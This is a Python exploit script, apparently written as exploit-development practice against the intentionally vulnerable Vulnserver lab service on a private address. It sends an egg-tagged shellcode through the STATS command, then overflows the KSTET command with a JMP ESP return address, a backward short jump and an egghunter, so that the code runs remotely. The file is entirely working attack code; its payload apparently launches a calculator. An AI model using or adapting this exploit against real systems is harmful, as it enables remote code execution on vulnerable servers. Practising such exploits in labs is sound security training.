import socket

from utils import rl, badchar, egghunter_1, shellcode_calc, shellcode_calc2
from pwn import p32


# s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# connect = s.connect(('192.168.58.135',9999))


# A_padding = b"A" * 66
# eip=b"\x90"*4
# buffer=b'KSTET /.:/' + A_padding+eip +b"C"*(90-len(A_padding)-len(eip))+b'\r\n'
# # buffer=b'KSTET /.:/' + badchar+b'\r\n'

padding = b"\x90" * (66-len(egghunter_1))
jmpesp=p32(0x625011af)
jmp_prev_38=b"\xeb\xd2\x90\x90"
jmp_prev_46=b"\xeb\xd2\x90\x90"
eip=jmpesp
egg=b'hackhack'
buffer_with_egghunter=b'KSTET /.:/' + padding+egghunter_1+eip+jmp_prev_38+b"C"*(90-66-len(eip)-len(jmp_prev_38))
buffer_with_shellcode=b'STATS /.:/' + egg+b"\x90"*50+shellcode_calc2 +b'\r\n'

print(egg.hex())


poc = b"\x90"*(66-len(egghunter_1)-8) + egghunter_1 +b"\x90"*8+ b"\xaf\x11\x50\x62" +b"\xeb\xd2\x90\x90" + b"C"*(90-66-4-4)
buffer_test=b'KSTET /.:/'+poc
# s.send(buffer_with_shellcode)
# s.recv(1024)
# s.send(b'EXIT' +b'\r\n')
#
# s1 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# connect1 = s1.connect(('192.168.58.135',9999))
# s1.recv(1024)
# s1.send(buffer_test)


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('192.168.58.135',9999))
s.send(b'STATS /.:/' + egg+b"\x90"*50+shellcode_calc2 +b'\r\n')
s.recv(1024)
s.send(b'EXIT' +b'\r\n')
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('192.168.58.135',9999))
s.send(b'KSTET /.:/' + poc +b'\r\n')
s.recv(1024)
s.send(b'EXIT' +b'\r\n')
s.close()